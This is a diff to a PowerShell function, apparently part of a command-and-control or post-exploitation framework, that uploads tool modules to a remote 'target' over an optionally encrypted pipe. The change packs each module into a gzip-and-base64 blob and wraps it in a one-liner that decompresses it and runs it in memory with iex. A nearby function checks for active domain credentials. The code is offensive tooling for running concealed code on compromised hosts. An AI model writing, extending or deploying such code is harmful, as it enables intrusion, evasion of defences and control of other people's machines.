@@ -467,29 +467,25 @@ function Send-Module {
 
     $code      = $global:ToolCache[$ToolName]
     $codeBytes = [System.Text.Encoding]::UTF8.GetBytes($code)
-    $chunkSize = 4096
-    $totalChunks = [Math]::Ceiling($codeBytes.Length / $chunkSize)
-    Write-Host " [*] Uploading '$ToolName' to target ($([Math]::Round($codeBytes.Length/1KB,0)) KB, $totalChunks chunks)..." -ForegroundColor Cyan
 
-    $begin = "__MODULE_BEGIN__:${ToolName}:$($codeBytes.Length)"
-    if ($SessionKey) { $begin = Protect-PipeMessage -PlainText $begin -Key $SessionKey }
-    $Writer.WriteLine($begin); $Writer.Flush()
+    $ms  = [System.IO.MemoryStream]::new()
+    $gzs = [System.IO.Compression.GzipStream]::new($ms, [System.IO.Compression.CompressionMode]::Compress)
+    $gzs.Write($codeBytes, 0, $codeBytes.Length)
+    $gzs.Close()
+    $b64 = [Convert]::ToBase64String($ms.ToArray())
 
-    for ($i = 0; $i -lt $codeBytes.Length; $i += $chunkSize) {
-        $chunk    = $codeBytes[$i..([Math]::Min($i + $chunkSize - 1, $codeBytes.Length - 1))]
-        $line     = "__MODULE_CHUNK__:$([Convert]::ToBase64String($chunk))"
-        if ($SessionKey) { $line = Protect-PipeMessage -PlainText $line -Key $SessionKey }
-        $Writer.WriteLine($line)
-    }
-    $Writer.Flush()
+    Write-Host " [*] Uploading '$ToolName' to target ($([Math]::Round($codeBytes.Length/1KB,0)) KB raw, $([Math]::Round($ms.Length/1KB,0)) KB compressed)..." -ForegroundColor Cyan
 
-    $end = "__MODULE_END__:${ToolName}"
-    if ($SessionKey) { $end = Protect-PipeMessage -PlainText $end -Key $SessionKey }
-    $Writer.WriteLine($end); $Writer.Flush()
+    $cmd = '$_gz=''' + $b64 + ''';$_m=New-Object IO.MemoryStream(,[Convert]::FromBase64String($_gz));$_s=New-Object IO.Compression.GzipStream($_m,[IO.Compression.CompressionMode]::Decompress);$_o=New-Object IO.MemoryStream;$_s.CopyTo($_o);iex ([Text.Encoding]::UTF8.GetString($_o.ToArray()))'
+    if ($SessionKey) { $cmd = Protect-PipeMessage -PlainText $cmd -Key $SessionKey }
+    $Writer.WriteLine($cmd); $Writer.Flush()
 
-    $ack = $Reader.ReadLine()
-    if ($SessionKey -and $ack) { $ack = Unprotect-PipeMessage -CipherB64 $ack -Key $SessionKey }
-    return ($ack -eq $global:EndMarker)
+    do {
+        $line = $Reader.ReadLine()
+        if ($SessionKey -and $line) { $line = Unprotect-PipeMessage -CipherB64 $line -Key $SessionKey }
+    } while ($line -ne $null -and $line -ne $global:EndMarker)
+
+    return ($line -eq $global:EndMarker)
 }
 function Test-NetworkLogonToken {
     # Returns identity name string if domain credentials are active in this process, $false otherwise.
